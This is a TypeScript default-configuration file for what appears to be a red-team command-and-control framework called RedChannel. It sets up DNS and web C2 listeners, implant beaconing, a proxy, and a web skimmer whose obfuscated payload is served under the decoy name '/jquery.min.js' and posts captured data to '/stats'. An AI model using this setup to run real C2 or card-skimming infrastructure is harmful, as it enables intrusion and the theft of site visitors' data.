import * as crypto from "crypto";
import { RedChannelConfig } from "../pb/config";

export const DefaultConfig: RedChannelConfig = {
    c2: {
        domain: "c2.redchannel.tld",
        dnsIp: "127.0.0.1",
        dnsPort: 53,
        webIp: "127.0.0.1",
        webPort: 80,
        webUrl: "http://127.0.0.1/",
        tsIp: "127.0.0.1",
        tsPort: 4321,
        binaryRoute: "/agent",
        debug: true,
        operators: {},
    },
    proxy: {
        enabled: false,
        key: crypto.randomBytes(6).toString("hex"),
        interval: 2000,
        obfuscatePayload: false,
        url: "http://127.0.0.1/",
    },
    implant: {
        interval: 5000,
        resolver: "8.8.8.8:53",
        proxyEnabled: false,
        proxyKey: "redchannel",
        proxyUrl: "",
        throttleSendq: true,
        debug: false,
    },
    skimmer: {
        payloadRoute: "/jquery.min.js",
        dataRoute: "/stats",
        url: "",
        targetClasses: [],
        targetIds: [],
        obfuscatePayload: true,
    },
    staticDns: { "c2.redchannel.tld": "127.0.0.1" },
};
